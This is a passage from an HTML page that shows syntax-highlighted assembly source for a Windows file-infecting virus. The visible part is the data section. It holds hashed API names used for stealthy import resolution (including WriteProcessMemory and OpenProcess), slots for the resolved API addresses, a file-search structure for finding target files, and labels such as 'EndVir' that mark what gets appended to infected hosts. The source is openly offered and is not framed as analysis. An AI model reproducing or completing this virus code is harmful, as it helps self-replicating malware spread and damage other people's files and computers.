                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">028f8c6fbh</span><span class="sc0">  </span><span class="sc1">;GetCurrentDirectoryA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00029ecfbh</span><span class="sc0">  </span><span class="sc1">;GetCurrentProcessId </span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09c3a5210h</span><span class="sc0">  </span><span class="sc1">;GetDriveTypeA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">040bf2f84h</span><span class="sc0">  </span><span class="sc1">;GetProcAddress</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">032beddc3h</span><span class="sc0">  </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0c329f65bh</span><span class="sc0">  </span><span class="sc1">;OpenProcess  </span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08e0e5487h</span><span class="sc0">  </span><span class="sc1">;SetCurrentDirectoryA</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0bc738ae6h</span><span class="sc0">  </span><span class="sc1">;SetEndOfFile</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">050665047h</span><span class="sc0">  </span><span class="sc1">;SetFileAttributesA </span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">06d452a3ah</span><span class="sc0">  </span><span class="sc1">;SetFilePointer</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09f69de76h</span><span class="sc0">  </span><span class="sc1">;SetFileTime</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">03a00e23bh</span><span class="sc0">  </span><span class="sc1">;Sleep</span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0fae00d65h</span><span class="sc0">  </span><span class="sc1">;UnmapViewOfFile    </span><span class="sc0">
                                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">01e9fa310h</span><span class="sc0">  </span><span class="sc1">;WriteProcessMemory </span><span class="sc0">
</span><span class="sc5">EndVir</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;What is following isn't appended to target</span><span class="sc0">


</span><span class="sc1">;ApiAddresses:</span><span class="sc0">
              
        </span><span class="sc5">CloseHandle</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">CreateFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">CreateFileMappingA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">CreateThread</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">FindClose</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">FindFirstFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">FindNextFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">GetCurrentProcessId</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
        </span><span class="sc5">GetDriveTypeA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
       </span><span class="sc5">_GetProcAddress</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">MapViewOfFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">OpenProcess</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SetEndOfFile</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  
        </span><span class="sc5">SetFileAttributesA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SetFilePointer</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SetFileTime</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">_Sleep</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">WriteProcessMemory</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        
</span><span class="sc1">;Variables:</span><span class="sc0">

        </span><span class="sc5">FileHandle</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">MapHandle</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">MapAddress</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Counter</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Crc</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
        </span><span class="sc5">Depth</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
        </span><span class="sc5">ThreadID</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">SectN</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">ApiOriginalAdd</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      
        </span><span class="sc5">API_Field</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
 
</span><span class="sc1">;search structure:</span><span class="sc0">

        </span><span class="sc5">FileAttributes</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; attributes</span><span class="sc0">
        </span><span class="sc5">CreationTime</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; time of creation</span><span class="sc0">
        </span><span class="sc5">LastAccessTime</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; last access time</span><span class="sc0">
        </span><span class="sc5">LastWriteTime</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; last modificationm</span><span class="sc0">
        </span><span class="sc5">FileSizeHigh</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">; filesize</span><span class="sc0">
        </span><span class="sc5">FileSize</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">Reserved0</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">Reserved1</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">FileName</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MaxPath</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; long filename</span><span class="sc0">
        </span><span class="sc5">AlternateFileName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; short filename</span><span class="sc0">
        </span><span class="sc5">DirExe</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MaxPath</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">EndVir0</span><span class="sc4">:</span><span class="sc0">
 
</span><span class="sc5">API_Buffer</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">HOST</span></div></body>
</html>
